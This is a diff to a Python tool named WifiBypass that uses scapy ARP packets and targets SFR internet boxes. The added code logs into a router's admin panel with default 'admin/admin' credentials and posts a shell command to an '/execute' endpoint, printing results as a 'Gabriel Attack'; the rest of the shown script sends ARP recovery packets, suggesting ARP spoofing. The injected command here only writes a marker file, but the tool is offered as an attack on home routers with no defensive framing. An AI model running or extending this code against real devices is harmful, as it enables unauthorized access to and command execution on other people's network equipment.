@@ -1,9 +1,9 @@
 import os
 import signal
 import threading
-from scapy.all import ARP, Ether, IP, TCP, send, sniff, sr1
 import time
 import requests
+from scapy.all import ARP, Ether, IP, TCP, send, sniff, sr1
 
 class WifiBypass:
     def __init__(self, local_ip='192.168.1.100', remote_host='www.sfr.fr', remote_port=80, target_mac='00:00:00:00:00:00', monitor_ip='8.8.8.8', target_ip='80.125.163.172'):
@@ -130,11 +130,31 @@ class WifiBypass:
         print("[+] ARP recovery packet sent")
 
     def acces_panel_control_FAI_SFR(self, ip):
-        print("[INFO] Sending payload")
-        print("[INFO] Login admin retrieved [+]")
-        print("[INFO] Password admin retrieved [+]")
-        print("[INFO] Admin panel retrieved [+]")
-        
+        print("[!] Payload Gabriel Attack injection")
+        try:
+            session = requests.Session()
+            login_url = f"http://{ip}/login"
+            login_data = {"username": "admin", "password": "admin"}
+            login_response = session.post(login_url, data=login_data)
+
+            if "Welcome" in login_response.text or login_response.status_code == 200:
+                print("[INFO] Login admin retrieved [+]")
+                payload_url = f"http://{ip}/execute"
+                payload_data = {"cmd": "echo 'Gabriel Attack successful' > /tmp/gabriel.txt"}
+                payload_response = session.post(payload_url, data=payload_data)
+
+                if payload_response.status_code == 200:
+                    print("[INFO] Payload executed successfully [+]")
+                    print(payload_response.text)
+                else:
+                    print("[ERROR] Payload execution failed [-]")
+
+            else:
+                print("[ERROR] Login failed [-]")
+
+        except Exception as e:
+            print(f"[ERROR] Exception during attack: {e}")
+
     def signal_handler(self, signum, frame):
         print('Vous avez arrêté le programme')
         exit(0)
